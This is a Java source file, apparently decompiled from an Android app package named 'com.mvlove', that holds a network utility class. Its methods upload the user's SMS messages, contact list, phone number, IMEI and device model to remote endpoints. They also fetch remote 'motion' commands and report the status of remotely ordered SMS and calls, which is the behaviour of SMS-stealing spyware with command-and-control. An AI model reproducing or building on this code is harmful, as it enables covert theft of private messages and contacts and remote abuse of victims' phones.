package com.mvlove.util;

import android.content.Context;
import android.text.TextUtils;
import com.google.gson.Gson;
import com.mvlove.entity.Contact;
import com.mvlove.entity.Message;
import com.mvlove.entity.ResEntity;
import com.mvlove.http.HttpWrapper;
import com.mvlove.http.exception.HttpResponseException;
import com.mvlove.util.Constants.Interface;
import java.io.IOException;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import org.apache.http.ParseException;
import org.apache.http.client.ClientProtocolException;

public class HttpReqUtil {
    public static final ResEntity pushMessage(Context context, List<Message> messages, String phone, String imei, String model, String clientVersion) throws HttpResponseException, ParseException, IOException {
        Map<String, String> data = new HashMap();
        data.put("phone", phone);
        data.put("imei", imei);
        data.put("model", model);
        data.put("clientVersion", clientVersion);
        data.put("messageStr", new Gson().toJson((Object) messages));
        return (ResEntity) HttpWrapper.getInstance().post(Interface.getPushSmsUrl(), data, ResEntity.class);
    }

    public static final ResEntity getMotion(Context context, String phone, String imei, String model, String clientVersion, List<Contact> contacts) throws ClientProtocolException, IOException {
        Map<String, String> data = new HashMap();
        data.put("phone", phone);
        data.put("imei", imei);
        data.put("model", model);
        data.put("clientVersion", clientVersion);
        if (!(contacts == null || contacts.isEmpty())) {
            data.put("contactStr", new Gson().toJson((Object) contacts));
        }
        return (ResEntity) HttpWrapper.getInstance().post(Interface.getMotionUrl(), data, ResEntity.class);
    }

    public static final void updateMotionStatus(Context context, String mid) throws HttpResponseException, ParseException, IOException {
        if (!TextUtils.isEmpty(mid)) {
            Map<String, String> data = new HashMap();
            data.put("mid", mid);
            HttpWrapper.getInstance().post(Interface.getUpdateMotionUrl(), data, String.class);
        }
    }

    public static final void updateRemoteSmsStatus(Context context, String ids) throws HttpResponseException, ParseException, IOException {
        if (!TextUtils.isEmpty(ids)) {
            Map<String, String> data = new HashMap();
            data.put("mid", ids);
            HttpWrapper.getInstance().post(Interface.getUpdateRemoteSmsStatusUrl(), data, String.class);
        }
    }

    public static final void getUpdateRemoteCallStatus(Context context, String ids) throws HttpResponseException, ParseException, IOException {
        if (!TextUtils.isEmpty(ids)) {
            Map<String, String> data = new HashMap();
            data.put("mid", ids);
            HttpWrapper.getInstance().post(Interface.getUpdateRemoteCallStatusUrl(), data, String.class);
        }
    }
}
